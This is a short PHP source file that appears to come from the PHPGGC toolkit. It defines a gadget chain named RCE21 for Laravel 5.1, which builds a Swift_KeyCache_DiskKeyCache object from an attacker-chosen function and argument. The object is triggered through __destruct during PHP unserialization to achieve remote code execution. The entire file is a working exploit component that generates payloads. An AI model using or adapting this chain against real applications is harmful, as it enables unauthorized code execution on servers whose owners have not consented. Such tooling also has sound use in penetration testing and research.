<?php

namespace GadgetChain\Laravel;

class RCE21 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.1.*';
    public static $vector = '__destruct';
    public static $author = 'fallingskies';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Swift_KeyCache_DiskKeyCache(
            $function,
            $parameter
        );
    }
}
